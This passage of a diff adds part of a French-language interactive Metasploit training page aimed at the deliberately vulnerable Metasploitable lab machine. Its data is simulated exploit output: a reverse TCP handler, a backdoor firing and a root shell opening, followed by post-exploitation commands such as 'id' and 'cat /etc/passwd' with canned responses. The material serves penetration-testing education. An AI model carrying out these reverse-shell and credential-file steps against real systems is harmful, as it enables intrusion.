+      note:"run / exploit → lance le module.",
+      output:[
+        {t:"[*] Started reverse TCP handler on 192.168.56.10:4444", c:"o"},
+        {t:"[+] Backdoor triggered! Command execution confirmed", c:"ok"},
+        {t:"[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:42617)", c:"ok", id:"hl-session"}
+      ] },
+
+    { kind:"type", phase:"post-exploitation", context:"root@metasploitable", prompt:"#",
+      task:"Vérifie l'identité obtenue.",
+      accepted:["id", "whoami"],
+      hint:"Commande courte, déjà vue.",
+      hint2:"id affiche l'identité et les groupes ; whoami seulement le nom.",
+      note:"id / whoami → vérifie l'identité effective du shell.",
+      output:[{t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}] }
+  ];
+
+  let freeContext = "root@metasploitable";
+  const freeCommands = {
+    "root@metasploitable": {
+      "whoami": [{t:"root", c:"ok"}],
+      "id": [{t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}],
+      "pwd": [{t:"/", c:"o"}],
+      "ls /": [{t:"bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var", c:"o"}],
+      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}],
+      "hostname": [{t:"metasploitable", c:"o"}],
+      "cat /etc/passwd": [
+        {t:"root:x:0:0:root:/root:/bin/bash", c:"o"},
+        {t:"…", c:"o"},
+        {t:"msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash", c:"o"}
+      ],
+      "exit": [{t:"(session terminée)", c:"o"}]
+    }
+  };
+
+  let freeHintHtml = "Session root ouverte. Tape <strong style=\"color:var(--text)\">whoami</strong>, <strong style=\"color:var(--text)\">id</strong>, <strong style=\"color:var(--text)\">ls /</strong> ou <strong style=\"color:var(--text)\">exit</strong>.";
+</script>
+<script src="engine.js"></script>
+
+</body>
+</html>
